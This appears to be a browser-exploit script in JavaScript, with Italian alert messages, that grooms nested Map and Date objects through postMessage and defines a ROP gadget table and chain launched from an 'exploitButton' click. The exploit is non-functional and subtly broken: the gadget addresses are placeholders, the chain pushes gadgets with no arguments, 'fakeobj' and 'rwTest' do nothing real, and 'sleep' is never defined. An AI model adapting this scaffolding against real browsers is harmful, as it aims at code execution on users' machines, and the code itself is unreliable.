const gadgets = {
    "pop_rdi": 0x0000000000401234,
    "pop_rsi": 0x0000000000405678,
    "pop_rdx": 0x0000000000409abc,
    "ret": 0x000000000040abcd,
    "system": 0x0000000000401111,
    "exit": 0x0000000000402222
};

function gc() {
    try {
        new Uint8Array(256 * 1024);
        alert('Garbage Collection eseguita');
    } catch (e) {
        alert("Errore durante Garbage Collection: " + e.message);
    }
}

function createObjectStructure(num_elems) {
    let root = new Map();
    let msg = root;
    let foo = [];

    for (let i = 0; i < 5; i++) {
        foo.push(new Date(0xffff));
    }

    for (let i = 0; i < num_elems; i++) {
        const d = new Date(i);
        const map = new Map();
        msg.set(d, [map, foo]);
        msg = map;
    }

    gc();
    alert('Object structure creata');
    return root;
}

function fakeobj() {
    let fakeObject = { "__proto__": null };
    return fakeObject;
}

function rwTest(address, value) {
    alert(`Test RW: Scrivo ${value} in ${address}`);
}

function ropChain() {
    const chain = [];
    chain.push(gadgets.pop_rdi);
    chain.push(gadgets.pop_rsi);
    chain.push(gadgets.pop_rdx);
    chain.push(gadgets.ret);
    chain.push(gadgets.system);
    chain.push(gadgets.exit);
    return chain;
}

export async function main() {
    alert("Exploit iniziato");

    const num_elems = 5;
    let root = createObjectStructure(num_elems);
    let msg = root;
    let data2 = null;
    let idx = null;

    alert("Oggetto struttura creata");

    let found = false;
    while (!found) {
        let data = null;
        const prom = new Promise(resolve => {
            addEventListener('message', event => {
                data = event;
                resolve();
            }, { once: true });
        });

        alert("Postando messaggio...");
        postMessage(msg, origin);
        await prom;
        data = data.data;

        gc();

        await sleep(100);

        let i;
        try {
            alert("Inizio ricerca dell'indice...");
            for (i = 0; i < num_elems; i++) {
                if (data.keys().next().value.getTime() === 0xffff) {
                    idx = i;
                    found = true;
                    break;
                }
                data = data.values().next().value[0];
            }
        } catch (e) {
            alert("Errore durante l'elaborazione del messaggio: " + e.message);
            break;
        }
    }

    alert('Exploit attivato, prova a fare crash');
    alert('[+] idx: ' + idx);

    let rop = ropChain();
    rwTest(0xdeadbeef, 0x1337);
    alert("ROP chain e test RW completati");
}

document.getElementById('exploitButton').addEventListener('click', async () => {
    await main();
});
